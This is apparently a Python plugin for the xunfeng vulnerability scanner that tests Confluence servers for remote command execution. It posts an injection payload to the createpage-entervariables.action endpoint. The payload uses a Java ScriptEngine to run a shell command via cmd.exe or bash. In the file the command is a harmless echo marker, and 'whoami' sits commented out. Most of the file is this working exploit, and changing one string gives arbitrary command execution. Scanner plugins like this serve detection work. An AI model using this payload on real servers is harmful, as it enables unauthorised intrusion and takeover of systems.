# -*- coding: utf-8 -*-
import requests
from bs4 import BeautifulSoup
import json

'''
如果是在docker下运行的巡风，请执行以下操作：
1、下载 beautifulsoup4-4.6.x.tar.gz 到docker的宿主机 （版本自行下载，https://pypi.org/simple/beautifulsoup4/）
2、拷贝文件：docker cp beautifulsoup4-4.6.x.tar.gz  dockerContainerID:/var/log/
3、进入docker解压并安装：docker exec -it ID /bin/bash
'''

def get_plugin_info():
    plugin_info={
        "name":"confluence命令执行",
        "info":"命令执行",
        "level":"高危",
        "type":"命令执行",
        "author":"annt",
        "keyword":"confluence",
        "source":1
        }
    return plugin_info


def check(host,port,timeout):
    url = "http://%s:%d"%(host,int(port))+'/pages/createpage-entervariables.action?SpaceKey=x'
    session = requests.Session()
    cmd = 'echo Llong12580'
    #cmd = 'whoami'
    xpl_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip, deflate"}
    xpl_data = {"queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022"+cmd+"\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
    try:
        rawHTML = session.post(url, headers=xpl_headers, data=xpl_data, verify=False)
        soup = BeautifulSoup(rawHTML.text, 'html.parser')
        queryStringValue = soup.find('input',attrs = {'name':'queryString', 'type':'hidden'})['value']
        #print rawHTML.text
        if 'Llong12580' in queryStringValue and 'java.lang.System.' not in queryStringValue:
            return u'存在confluence命令执行:'+url
    except:
        pass